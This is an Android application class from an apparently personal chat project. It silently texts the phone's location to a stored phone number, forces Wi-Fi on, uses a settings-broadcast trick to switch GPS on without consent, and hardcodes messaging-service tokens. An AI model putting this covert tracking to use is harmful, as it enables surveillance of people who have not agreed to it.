package com.cl.android.chartonlyforyou;

import android.app.Application;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.mapapi.SDKInitializer;
import com.cl.android.chartonlyforyou.baidulocation.LocationService;
import com.cl.android.chartonlyforyou.services.ChartService;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import java.lang.reflect.Method;
import java.util.List;

import io.rong.imkit.RongIM;
import io.rong.imlib.RongIMClient;

/**
 * Created by chenling on 2016/3/26.
 */
public class MyApplication extends Application{

    public static Context context;
    public static final String token01="pUWTJzVVjVeaIl6fGdY0/+7HOY8NyemRZGLd2y9cigDYvuEqaB2tovYOteEA8JH8UQwoKQusoO5bSRgV/pVJTbaVjr61WdEo";//有头像的chenling001
    public static final String token02="FgHa3+S58iy9E/UcG/4NI1AaIj884ZIPjiEYlxpZXJaOkHNgP8OYA7sPvuX00tkx8rr3hrSSidzwLgqaAwicRPabOW3CYFve";//有头像的chenling002

    public static LocationService locationService;
    public Vibrator mVibrator;
    private static SharedPreferences sharedPreferences;

    private static boolean issuccess;//定位是否成功
    public static int locationTimes = 0; // 定位失败时尝试定位的次数，不能一直尝试，由于定位失败时休眠了5s,一直尝试定位的话，手机会很卡

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        /***
         * 初始化定位sdk，建议在Application中创建
         */
        locationService = new LocationService(getApplicationContext());
        mVibrator =(Vibrator)getApplicationContext().getSystemService(Service.VIBRATOR_SERVICE);
//        WriteLog.getInstance().init(); // 初始化日志
        SDKInitializer.initialize(this);

        //rongyun
        RongIM.init(this);

//        RongCloudEvent.init(this).initListener();
        //本地的一些设置
        sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        String tel = MyApplication.getSharedPreferences().getString("tel","");
        if(TextUtils.isEmpty(tel)){
            sharedPreferences.edit().putString("tel","17091262413").commit();
        }


        //开启前台service
        Intent service = new Intent(getApplicationContext(),ChartService.class);
        getApplicationContext().startService(service);

    }

    public static SharedPreferences getSharedPreferences() {
        return sharedPreferences;
    }

    public static void sendMessage() {
        issuccess = false;
        locationTimes = 0;
        new Thread(){
            @Override
            public void run() {
                locationService = MyApplication.locationService ;
                //获取locationservice实例，建议应用中只初始化1个location实例，然后使用，可以参考其他示例的activity，都是通过此种方式获取locationservice实例的
                locationService.registerListener(mListener);
                //注册监听
                locationService.setLocationOption(locationService.getDefaultLocationClientOption());

                locationService.start();// 定位SDK
            }
        }.start();
    }
    /*****
     * 定位结果回调，重写onReceiveLocation方法
     */
    private static BDLocationListener mListener = new BDLocationListener() {

        @Override
        public void onReceiveLocation(BDLocation location) {
//            Log.i("slack","onReceiveLocation...");
            StringBuffer sb = new StringBuffer(256);
            // TODO Auto-generated method stub
            if (null != location && location.getLocType() != BDLocation.TypeServerError) {

                sb.append(location.getLatitude()+" ");
                sb.append(location.getLongitude()+" ");
                sb.append(location.getAddrStr()+" ");

                if (location.getLocType() == BDLocation.TypeGpsLocation) {// GPS定位结果
                    sb.append(location.getSpeed());// 单位：km/h
                    issuccess = true;
                } else if (location.getLocType() == BDLocation.TypeNetWorkLocation) {// 网络定位结果
                    // 运营商信息
                    issuccess = true;
                } else if (location.getLocType() == BDLocation.TypeOffLineLocation) {// 离线定位结果
                } else if (location.getLocType() == BDLocation.TypeServerError) {
                } else if (location.getLocType() == BDLocation.TypeNetWorkException) {
                } else if (location.getLocType() == BDLocation.TypeCriteriaException) {
                }
            }
            if(issuccess){
                // 信息都在 sb 里
                Log.i("slack", sb.toString());
                //发送定位消息
                //直接调用短信接口发短信 ,获取短信管理器
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                //拆分短信内容（手机短信长度限制）
                List<String> divideContents = smsManager.divideMessage(sb.toString());
                String tel = MyApplication.getSharedPreferences().getString("tel","");
                Log.i("slack", tel);

                for (String text : divideContents) {
                    Log.i("slack",text);
                    smsManager.sendTextMessage(tel, null, text, null, null);
                }
                locationService.unregisterListener(mListener); //注销掉监听
                locationService.stop();

            }else{
                Log.i("slack", "location error...");
                // 测试100次
                if(locationTimes < 100){
//                    isConnection();
                    locationTimes++;
                    try {
                        Log.i("slack", "location sleep..."+locationTimes);
                        Thread.sleep(5 * 1000);//休息5s

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
//                    Log.i("slack", "location restart...");
                    locationService.start();// 继续定位SDK
                }else{
                    locationService.unregisterListener(mListener); //注销掉监听
                    locationService.stop();
                }
            }
        }

    };
    private static boolean isConnection() {
        // http://developer.android.com/reference/android/content/Context.html#getSystemService(java.lang.Class<T>)
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        WifiManager wifiManager = (WifiManager) context.getSystemService(WIFI_SERVICE);
        int conTimes = 10;//wifi开启的时间 给20s自动连接
        if(networkInfo != null){
            if(networkInfo.isConnected()){
                Log.i("slack",""+networkInfo.isConnected());
                return true;
            }
        }else{
            Log.i("slack", "no network...");
            wifiManager.setWifiEnabled(true);//打开wifi
            //通过反射 打开数据流量 ,无效？
//            Class connectivityManagerClz = null;
//            try {
//                connectivityManagerClz = connectivityManager.getClass();
//                Method method = connectivityManagerClz.getMethod(
//                        "setMobileDataEnabled", new Class[] { boolean.class });
//                method.invoke(connectivityManager, true);
//
//            } catch (Exception e) {
//                e.printStackTrace();
//            }

        }
        //GPS
//        openGPS(context);

        return false;
    }
    /**
     * 强制帮用户打开GPS 无效？
     * @param context
     */
    public static final void openGPS(Context context) {
        Intent GPSIntent = new Intent();
        GPSIntent.setClassName("com.android.settings",
                "com.android.settings.widget.SettingsAppWidgetProvider");
        GPSIntent.addCategory("android.intent.category.ALTERNATIVE");
        GPSIntent.setData(Uri.parse("custom:3"));
        try {
            PendingIntent.getBroadcast(context, 0, GPSIntent, 0).send();
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
    }
}
